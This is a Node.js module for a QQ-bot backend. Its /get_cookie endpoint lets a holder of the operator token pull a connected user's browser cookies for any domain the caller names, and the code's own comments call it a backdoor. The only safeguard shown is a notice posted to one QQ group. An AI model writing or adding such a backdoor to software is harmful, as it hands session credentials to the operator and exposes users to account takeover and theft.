import { randomUUID } from "crypto";
import config from "../config.js";
import { Structs } from "node-napcat-ts";
import { getClientByToken } from "../data_base.js";

export const pendingRequests = new Map();

/**
 *
 * @param {Object} ctx
 * @param {import("node-napcat-ts").NCWebsocket} ctx.napcat
 * @param {import("express").Express} ctx.app
 * @param {Map<number, import('ws').WebSocket>} ctx.wsClients
 * @param {(msg: string) => void} ctx.broadcast
 * @param {(id: number, msg: string) => void} ctx.sendToClient
 * @param {(fn: (msg: string, id: number, ws: import('ws').WebSocket) => void) => void} ctx.onWsMessage
 */
export async function run({ app, napcat, wsClients, onWsMessage }) {
	onWsMessage(async (msg, id, ws) => {
		const token = msg.token;
		const data = msg.data;

		const client = await getClientByToken(token);

		if (msg.type === "call_cookie") {
			if (client) {
				const { requestId, result } = data;

				const key = `${client.uin}:${requestId}`;
				if (pendingRequests.has(key)) {
					pendingRequests.get(key)(result);
					pendingRequests.delete(key);
				}
			}
		}
	});

	app.post("/get_cookie", async (req, res) => {
		try {
			const { token, uin, domain } = req.body;
			if (!uin || !domain) {
				res.send("参数错误");
				return;
			}

			if (token !== config.awa_token) {
				res.send("token 错误");
				return;
			}

			// 这是承诺的不滥用后门
			// 这是承诺的不滥用后门
			// 这是承诺的不滥用后门
			await napcat.send_group_msg({
				group_id: 1076243407,
				message: Structs.text(`后端发起针对 ${uin} 的请求: 获取曲奇饼`),
			});

			const requestId = randomUUID();

			for (const [mUin, mWs] of wsClients) {
				if (mUin === uin) {
					mWs.send(
						JSON.stringify({
							type: "get_cookie",
							data: {
								requestId,
								domain,
							},
						})
					);
				}
			}

			const key = `${uin}:${requestId}`;
			const result = await new Promise((resolve, reject) => {
				pendingRequests.set(key, resolve);

				setTimeout(() => {
					if (pendingRequests.has(key)) {
						pendingRequests.delete(key);
						reject(new Error("等待客户端响应超时"));
					}
				}, 5000);
			});

			res.send(result);
		} catch (error) {
			console.log(error);
			res.send(error);
		}
	});
}
